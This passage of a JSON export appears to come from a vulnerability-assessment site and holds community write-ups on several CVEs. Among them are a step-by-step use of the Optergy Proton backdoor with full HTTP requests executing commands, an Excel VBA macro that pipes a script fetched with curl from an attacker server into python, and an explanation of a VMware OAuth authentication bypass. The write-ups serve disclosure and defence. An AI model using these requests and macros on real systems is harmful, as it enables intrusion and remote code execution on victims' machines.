below reveals the logic how to use this 'developer' console. \r\nThe challenge is created once you issue the `/tools/ajax/ConsoleResult.html?get` AJAX request. This challenge is used to generate a `SHA-1` hash and then generate an `MD5` hash from the `SHA-1` hash. \r\nAt the end, you must concatenate the two values which becomes the answer that you need to issue together with the command you want to execute in the request.\r\n\r\nWith Cyberchef, you can easily compile the recipe together to get the results.\r\n[SHA1 of challenge value: 1679481930381](https://gchq.github.io/CyberChef/#recipe=SHA1(80)&input=MTY3OTQ4MTkzMDM4MQ)\r\n[MD5 of SHA1](https://gchq.github.io/CyberChef/#recipe=SHA1(80)MD5()&input=MTY3OTQ4MTkzMDM4MQ)\r\n\r\n```\r\nChallenge: 1679481930381\r\nSHA1: 6c2ba45326f687498923413420c890ebf5b7602c\r\nMD5 of SHA1: 421dc80c2bea0c3710679605a6159162\r\nResponse: 6c2ba45326f687498923413420c890ebf5b7602c 421dc80c2bea0c3710679605a6159162\r\n``` \r\n**Decompiled  ConsoleResult.class**\r\n\r\n```java\r\nConsoleResult.class:\r\n032: public class ConsoleResult\r\n033: implements ActionBean, ValidationErrorHandler\r\n034: {\r\n035: private ActionBeanContext context;\r\n036: @Validate(required=true, on={\"execute\"}, minlength=1)\r\n037: private String command;\r\n038: @Validate(required=true, on={\"execute\"}, minlength=1)\r\n039: private String challenge;\r\n040: @Validate(required=true, on={\"execute\"}, minlength=1)\r\n041: private String answer;\r\n042: private final Object lock;\r\n043:\r\n044: public ConsoleResult()\r\n045: {\r\n046: lock = new ConsoleResult.Lock(null);\r\n047: }\r\n048:\r\n049:\r\n050:\r\n051:\r\n052:\r\n053:\r\n054: @DefaultHandler\r\n055: public Resolution execute()\r\n056: {\r\n057: long l1 = 1500L;\r\n058: ServletContext localServletContext = getContext().getServletContext();\r\n059: List localList = (List)localServletContext.getAttribute(\"challengeList\");\r\n060:\r\n061: long l2 = Long.parseLong(challenge);\r\n062: if ((localList != null) && (localList.contains(Long.valueOf(l2))))\r\n063: {\r\n064: localList.remove(Long.valueOf(l2));\r\n065: String str1 = Util.makeSHA1Hash(Long.toString(l2));\r\n066: String str2 = Util.makeMD5Hash(str1);\r\n067: String str3 = str1 + str2;\r\n068:\r\n069: if (!str3.equals(answer))\r\n070: {\r\n071: return new JSONResolution(JSONConverter.createErrorResponse(\"Invalid Response to Answer\"));\r\n072: }\r\n073:\r\n074: String str4 = \"\";\r\n075: ProcessStreamReader localProcessStreamReader = null;\r\n076: try\r\n077: {\r\n078: String[] arrayOfString = command.split(\"\\\\ \");\r\n079: ProcessBuilder localProcessBuilder = new ProcessBuilder(arrayOfString);\r\n080: localProcessBuilder.redirectErrorStream(true);\r\n081: Process localProcess = localProcessBuilder.start();\r\n082: ConsoleResult.ProcessWrapper localProcessWrapper = new ConsoleResult.ProcessWrapper(this, localProcess);\r\n083:\r\n084: localProcessWrapper.start();\r\n085: localProcessStreamReader = new ProcessStreamReader(localProcessWrapper.getfProcess().getInputStream());\r\n086: localProcessStreamReader.start();\r\n087: try\r\n088: {\r\n089: localProcessWrapper.join(l1);\r\n090: localProcessStreamReader.join(l1);\r\n091: }\r\n092: catch (InterruptedException localInterruptedException)\r\n093: {\r\n094: localInterruptedException.printStackTrace();\r\n095: localProcessWrapper.interrupt();\r\n096: }\r\n097: }\r\n098: catch (Exception localException)\r\n099: {\r\n100: return new JSONResolution(JSONConverter.createErrorResponse(\"Invalid Command\"));\r\n101: }\r\n102:\r\n103:\r\n104: str4 = localProcessStreamReader.getString();\r\n105:\r\n106: JSONObject localJSONObject = JSONConverter.createMessageResponse(str4);\r\n107: return new JSONResolution(localJSONObject);\r\n108: }\r\n109: return new JSONResolution(JSONConverter.createErrorResponse(\"Invalid Challenge\"));\r\n110: }\r\n111:\r\n112: public Resolution get()\r\n113: {\r\n114: ServletContext localServletContext = getContext().getServletContext();\r\n115: Object localObject = (List)localServletContext.getAttribute(\"challengeList\");\r\n116: if (localObject == null) {\r\n117: localObject = new ArrayList();\r\n118: }\r\n119: long l = System.currentTimeMillis();\r\n120: ((List)localObject).add(Long.valueOf(l));\r\n121:\r\n122: WebUtil.SetServletAttribute(localServletContext, \"challengeList\", localObject);\r\n123:\r\n124: JSONObject localJSONObject = JSONConverter.createMessageResponse(Long.toString(l));\r\n125: return new JSONResolution(localJSONObject);\r\n126: }\r\n```\r\nThe Burp output below shows exactly what happens under the cover.\r\n\r\n**Click Get button to get the challenge value**\r\n```html\r\nPOST /tools/ajax/ConsoleResult.html?get HTTP/1.1\r\nHost: 192.168.201.31\r\nContent-Length: 0\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\r\nX-Requested-With: XMLHttpRequest\r\nOrigin: http://192.168.201.31\r\nReferer: http://192.168.201.31/tools/Console.t00t\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCookie: JSESSIONID=D671EA8E9B1E2ED42528FD2DB16DE186\r\nConnection: close\r\n```\r\n**Response is a `JSON` message with the challenge value**\r\n```html\r\nHTTP/1.1 200 OK\r\nServer: Apache-Coyote/1.1\r\nCache-Control: no-cache, private, no-store, must-revalidate\r\nPragma: no-cache\r\nExpires: Thu, 01 Dec 1994 16:00:00 GMT\r\nContent-Type: application/json;charset=utf-8\r\nContent-Language: en-US\r\nContent-Length: 40\r\nDate: Wed, 22 Mar 2023 10:45:30 GMT\r\nConnection: close\r\n\r\n{\r\n  \"response\": {\r\n     \"message\":\"1679481930381\"\r\n   }\r\n}\r\n```\r\nNow use the `SHA1/MD5` recipe to determine the valid response to the challenge together with the command to be executed and click on the exec button.\r\nThis generates a POST request and executes the command.\r\n\r\n**Execute the `whoami` command**\r\n```html\r\nPOST /tools/ajax/ConsoleResult.html HTTP/1.1\r\nHost: 192.168.201.31\r\nContent-Length: 119\r\nAccept: */*\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded\r\nOrigin: http://192.168.201.31\r\nReferer: http://192.168.201.31/tools/Console.t00t\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCookie: JSESSIONID=D671EA8E9B1E2ED42528FD2DB16DE186\r\nConnection: close\r\n\r\n&command=whoami&challenge=1679481930381&answer=6c2ba45326f687498923413420c890ebf5b7602c421dc80c2bea0c3710679605a6159162\r\n```\r\n**Response is a `JSON` message with the command output of  `whoami`**\r\n```\r\nHTTP/1.1 200 OK\r\nServer: Apache-Coyote/1.1\r\nCache-Control: no-cache, private, no-store, must-revalidate\r\nPragma: no-cache\r\nExpires: Thu, 01 Dec 1994 16:00:00 GMT\r\nContent-Type: application/json;charset=utf-8\r\nContent-Language: en-US\r\nContent-Length: 38\r\nDate: Wed, 22 Mar 2023 10:49:56 GMT\r\nConnection: close\r\n\r\n{\r\n\"response\":{\r\n   \"message\":\"optergy\\r\\n\"\r\n   }\r\n}\r\n```\r\nThe above example shows once more that even sophisticated `backdoors` can be discovered by code reviews and therefore become vulnerable to misuse of malicious actors. It underpins the guidance again to avoid programming `backdoors` in your application code.\r\n\r\n## Mitigation\r\n All Optergy Proton / Enterprise versions `2.3.0a` and below are vulnerable.\r\nUnfortunate like most `IoT` type applications, still vulnerable deployments can be found since the discovery in 2019. \r\nPatching `IoT` devices still remains a challenge for a lot of companies out there :-(\r\n\r\nPlease upgrade to the subsequent versions to  mitigate this vulnerability.\r\n\r\nI could not resist the temptation to create a `Metasploit` module to test this vulnerability. A local version of this module can found at the **References** section and I have also created an [OVA image](https://github.com/h00die-gr3y/Metasploit/tree/main/images) with a vulnerable Optergy Proton application to play with.\r\n[Submission](https://github.com/rapid7/metasploit-framework/pull/17806) to the mainstream of `Metasploit` is completed.\r\n\r\n\r\n## References\r\n[CVE-2019-7276](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7276)\r\n[Applied Risk: Optergy Proton / Enterprise 2.3.0a Multiple Vulnerabilities](https://applied-risk.com/resources/ar-2019-008)\r\n[Public Exploit - Packetstorm](https://packetstormsecurity.com/files/155258/Optergy-BMS-2.0.3a-Remote-Root.html)\r\n[Metasploit module](https://github.com/rapid7/metasploit-framework/pull/17806)\r\n[Metasploit Development h00die-gr3y] (https://github.com/h00die-gr3y/Metasploit/blob/main/README.md)\r\n\r\n### Credits\r\nCredits goes to `Gjoko Krstic` a.k.a. `LiquidWorm` who discovered  this vulnerability.\r\n\r\n\r\n \r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "c9df25a2-1d33-48ec-b003-9a3eb1f852ad",
      "editorId": "f8689034-11e8-42b2-89f4-26046d1c2022",
      "topicId": "b9d14604-5820-4d08-80bf-5bb9cc0d44e8",
      "created": "2023-03-21T17:38:14.366401Z",
      "revisionDate": "2023-03-21T17:38:14.367302Z",
      "document": "",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        }
      ]
    },
    {
      "id": "7519456a-451e-4198-806a-41facce1eedf",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "495e6f29-61e8-4e0a-bd02-902aa3b7ce65",
      "created": "2023-03-22T09:38:55.418133Z",
      "revisionDate": "2023-05-02T10:58:52.467474Z",
      "document": "## [CVE-2023-23396 - Code Name Butterfly Effect](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23396)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/2023/CVE-2023-23396/docs/Screenshot%202023-03-22%20111145.png)\r\n\r\n## Description:\r\nThe attacker could exploit this vulnerability by convincing a victim to open a specially crafted XLSX file which when opened would cause a denial-of-service condition for other processes running on that machine. The victim can lose all the work - information which he currently works on it, and the company which is the actual employer of this victim can lose money because of this problem.\r\n\r\n## Reference:\r\n[href](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23396)\r\n\r\n## Proof and Exploit:\r\n[href](https://www.nu11secur1ty.com/2023/03/cve-2023-23396-code-name-butterfly.html)\r\n\r\n## Time spend:\r\n03:00:00",
      "score": 0,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "b26c246a-a6f3-4cc7-b8ea-a63e793ef336",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "18396340-7a88-47b1-96e5-7be3344350f3",
      "created": "2023-03-24T09:21:48.595332Z",
      "revisionDate": "2023-03-24T09:21:48.596686Z",
      "document": "There are at least two ways to achieve RCE.\r\n\r\n## Vector n\u00b01\r\n\r\nIt leaks the MySQL credentials, in default and most common configurations MySQL will be exposed only on `127.0.0.1` which make the attack ineffective. But if the database is exposed publicly, the attacker can [change the Joomla! Super User\u2019s password](https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F#Change_the_Password_in_the_Database). The attacker logs in administrative web interface and modify a template to include a webshell or install a malicious plugin.\r\n\r\n## Vector n\u00b02\r\n\r\nIt leaks the Joomla user database (usernames, emails, assigned group). The attacker can target a Super user and try bruteforce or credentials stuffing, then follows previously showcased paths to code execution.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "dae26add-9d18-4b32-8432-85f25ff1d144",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "68b508f4-3e21-472c-abb6-8fbec3bef712",
      "created": "2023-03-24T11:41:48.040486Z",
      "revisionDate": "2023-05-02T10:55:50.145429Z",
      "document": "## [CVE-2023-23398](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23398)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/2023/CVE-2023-23398/docs/Screenshot%202023-03-24%20123053.png)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/2023/CVE-2023-23398/docs/CVE-2023-23398.png)\r\n\r\n## Description:\r\nThe attack itself is carried out locally by a user with authentication to the targeted system. An attacker could exploit the vulnerability by convincing a victim, through social engineering, to download and open a specially crafted file from a website which could lead to a local attack on the victim's computer. The attacker can trick the victim to open a malicious web page by using an Excel malicious file and he can steal credentials, bank accounts information, sniffing and tracking all the traffic of the victim without stopping - it depends on the scenario and etc.\r\n\r\n## PoC\r\n\r\n## NOTE:\r\nThis is a Social Engineering custome user interaction spoofing method!\r\n\r\n## Usage\r\n\r\n1. Prepare your `PoC.xlsm` file with your information for your exploit server!\r\n2. Send to the victim by using the Social Engineering method.\r\n3. Wait until the victim click's on it.\r\n\r\n[+]Exploit:\r\n```vbs\r\nSub Check_your_salaries()\r\nCreateObject(\"Shell.Application\").ShellExecute \"microsoft-edge:http://192.168.100.96/\"\r\nEnd Sub\r\n```\r\n[+]Exploit + Curl Piping:\r\n\r\n## WARNING:\r\nThe exploit server must be BROADCASTING at the moment when the victim hit the button of the exploit!\r\n\r\n```vbs\r\nSub silno_chukane()\r\n  Call Shell(\"cmd.exe /S /c\" & \"curl -s http://192.168.100.96/PoC/PoC.py | python\", vbNormalFocus)\r\nEnd Sub\r\n```\r\n\r\n## Reference:\r\n[href](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23398)\r\n\r\n[href](https://www.rapid7.com/fundamentals/spoofing-attacks/)\r\n\r\n## Proof and Exploit\r\n[href](https://www.nu11secur1ty.com/2023/03/cve-2023-23398-microsoft-excel-spoofing.html)\r\n",
      "score": 0,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "155d1082-11dc-4fd7-9d4f-444c93d51489",
      "editorId": "44654038-2d60-4e36-9de2-fa2c7fba0756",
      "topicId": "2c015e85-6311-4f7f-b9a0-11de24c4089c",
      "created": "2023-04-03T17:26:23.872376Z",
      "revisionDate": "2023-04-03T17:26:23.871971Z",
      "document": "Google\u2019s Threat Analysis Group (TAG) released an advisory regarding zero-day vulnerabilities in Android, iOS, and Chromium-based browsers that could allow a threat actor to spy on affected devices. Threat actors targeted users via SMS phishing messages. The SMS contained a URL shortener (bit[.]ly) that delivered the exploit and redirected the victim to a spoof Variston website. The payload is a C++ malware containing functions that steal data from messaging platforms and browser applications. Users are encouraged to update their devices' applications, firmware, and operating systems to prevent further exploitation of unpatched systems.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        }
      ]
    },
    {
      "id": "1c3362e5-b938-4233-81c5-269411fc4b6d",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "77703151-8ab2-4cbb-8bb1-1e297443e8fe",
      "created": "2023-04-10T14:29:15.350483Z",
      "revisionDate": "2023-05-02T10:03:17.844684Z",
      "document": "## [CVE-2023-24892:Microsoft-Edge-(Chromium-based)-Webview2-Spoofing-Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-24892)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/Windows11Exploits/main/2023/CVE-2023-24892/docs/Screenshot%202023-04-10%20102024.png)\r\n\r\n## Description:\r\nThe Webview2 development platform is vulnerable to Spoofing attacks.\r\nThe attacker can build a very malicious web application and spread it to the victim's networks, by using a malicious server for this case,\r\nand when they downloaded it and open it this can be the last web app opening for them. The web application contains a malicious link and this URL can be absolutely dangerous for the victim who opened it.\r\n\r\nSTATUS: HIGH Vulnerability\r\n\r\n[+]Exploit structure:\r\n```c\r\nnamespace CVE_2023_24892\r\n{\r\n    partial class Form1\r\n    {\r\n        /// <summary>\r\n        /// Required designer variable.\r\n        /// </summary>\r\n        private System.ComponentModel.IContainer components = null;\r\n\r\n        /// <summary>\r\n        /// Clean up any resources being used.\r\n        /// </summary>\r\n        /// <param name=\"disposing\">true if managed resources should be disposed; otherwise, false.</param>\r\n        protected override void Dispose(bool disposing)\r\n        {\r\n            if (disposing && (components != null))\r\n            {\r\n                components.Dispose();\r\n            }\r\n            base.Dispose(disposing);\r\n        }\r\n\r\n        #region Windows Form Designer generated code\r\n\r\n        /// <summary>\r\n        /// Required method for Designer support - do not modify\r\n        /// the contents of this method with the code editor.\r\n        /// </summary>\r\n        private void InitializeComponent()\r\n        {\r\n            this.webView21 = new Microsoft.Web.WebView2.WinForms.WebView2();\r\n            ((System.ComponentModel.ISupportInitialize)(this.webView21)).BeginInit();\r\n            this.SuspendLayout();\r\n            // \r\n            // webView21\r\n            // \r\n            this.webView21.AllowExternalDrop = false;\r\n            this.webView21.CreationProperties = null;\r\n            this.webView21.DefaultBackgroundColor = System.Drawing.Color.Magenta;\r\n            this.webView21.Location = new System.Drawing.Point(1, 49);\r\n            this.webView21.Name = \"webView21\";\r\n            this.webView21.Size = new System.Drawing.Size(797, 402);\r\n            this.webView21.Source = new System.Uri(\"https://www.pornhub.com/\", System.UriKind.Absolute);\r\n            this.webView21.TabIndex = 0;\r\n            this.webView21.ZoomFactor = 1D;\r\n            // \r\n            // Form1\r\n            // \r\n            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);\r\n            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;\r\n            this.ClientSize = new System.Drawing.Size(800, 450);\r\n            this.Controls.Add(this.webView21);\r\n            this.Name = \"Form1\";\r\n            this.Text = \"CVE-2023-24892\";\r\n            ((System.ComponentModel.ISupportInitialize)(this.webView21)).EndInit();\r\n            this.ResumeLayout(false);\r\n\r\n        }\r\n\r\n        #endregion\r\n\r\n        private Microsoft.Web.WebView2.WinForms.WebView2 webView21;\r\n    }\r\n}\r\n```\r\n\r\n\r\n[href](https://github.com/nu11secur1ty/Windows11Exploits/tree/main/2023/CVE-2023-24892/PoC)\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/Windows11Exploits/tree/main/2023/CVE-2023-24892)\r\n\r\n## Proof and Exploit:\r\n[href](https://www.nu11secur1ty.com/2023/04/cve-2023-24892microsoft-edge-chromium.html)\r\n\r\n## More:\r\n[href](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-24892)\r\n\r\n## Time spend:\r\n03:00:00",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "61cd16ac-bdc6-4cb9-b1e3-8cd66eb6bf39",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "c7535262-ce2f-4139-8188-f2f7de20912e",
      "created": "2023-04-11T10:02:22.789867Z",
      "revisionDate": "2023-04-13T14:19:49.291669Z",
      "document": "Despite the CVE being registered for Wordpress, fckeditor is embedded in many CMS or custom applications and as such can impact more applications. However, fckeditor provides connectors for ASP, PHP, etc. but not JSP for example. So a Java app using fckeditor may be not vulnerable even with a vulnerable fckeditor.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "4b95a1c7-d741-4544-b202-57c717525bfb",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "848889fb-1358-431f-9188-5a46f6fe3d19",
      "created": "2023-04-11T18:26:56.445587Z",
      "revisionDate": "2023-04-13T14:19:46.525102Z",
      "document": "This vulnerability is an authentication bypass in VMware Workspace ONE and related products. The list of affected products and corresponding versions are:\r\n\r\n| Vulnerable Application  | Vulnerable version   |  \r\n|---|---|  \r\n| VMware Workspace ONE Access (Access)   |  21.08.0.1, 21.08.0.0, 20.10.0.1, 20.10.0.0  |  \r\n| VMware Identity Manager (vIDM)  |  3.3.6, 3.3.5, 3.3.4, 3.3.3  |  \r\n| VMware vRealize Automation (vRA)  |  8.x, 7.6  |  \r\n| VMware Cloud Foundation | 4.x | | vRealize Suite Lifecycle Manager| 8.x |\r\n\r\n## Reasoning for Exploitability & Attacker Value ratings: \r\nThis vulnerability was bundled in [VMSA-2022-0011](https://www.vmware.com/security/advisories/VMSA-2022-0011.html) along with 8 other CVEs.  Out of all the CVEs in this advisory [CVE-2022-22954](https://attackerkb.com/topics/BDXyTqY1ld/cve-2022-22954/rapid7-analysis?referrer=search) really stole the show as it was an unauthenticated remote code execution vulnerability. Not as many paid much mind to this CVE + [CVE-2022-22957](https://attackerkb.com/topics/q2klOXl2Cj/cve-2022-22957?referrer=search) (authenticated RCE) which when combined together with [CVE-2022-22960](https://attackerkb.com/topics/E62D0oFo6u/cve-2022-22960?referrer=search) (LPE) gives attackers yet another exploitation path to unauthenticated remote code execution in the context of the root user.\r\n\r\n## How it works:\r\nThe vulnerability lies in the fact that vulnerable VMware Workspace ONE Access versions shipped with two different default OAuth2 clients. By navigating to `https://photon-machine/SAAS/admin/settings/manage/manageOAuthClients/` on a vulnerable instance under Remote App Access users can see two separate Client IDs which are enabled by default to receive User Access Tokens in the scope of \"system, admin\":\r\n\r\n| CLIENT ID  | SCOPE  |  ACCESS TYPE | STATUS |\r\n|---|---|---|---|\r\n| acs   |  system,admin  |  User Access Token | Enabled\r\n| Service__OAuth2Client  |   system,admin  |  User Access Token | Enabled |\r\n\r\nThe auth by-pass works by abusing `com.vmware.horizon.rest.controller.oauth2.OAuth2TokenResourceController` which has two exposed endpoints: `/generateActivationToken/{id}` and `/activate` .  The first will generate an activation code for an existing oauth2 client (which we know two exist by default) and the second will activate the device oauth2 client by exchanging the activation code for a client ID and secret. \r\n\r\nThen the attacker can exchange the `client_id` and `client_secret` for an OAuth2 token and viola, the attacker has completely by-passed VMware's authentication mechanism. \r\n\r\n## References:\r\nhttps://srcincite.io/blog/2022/08/11/i-am-whoever-i-say-i-am-infiltrating-vmware-workspace-one-access-using-a-0-click-exploit.html#dbconnectioncheckcontroller-dbcheck-jdbc-injection-remote-code-execution\r\n",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
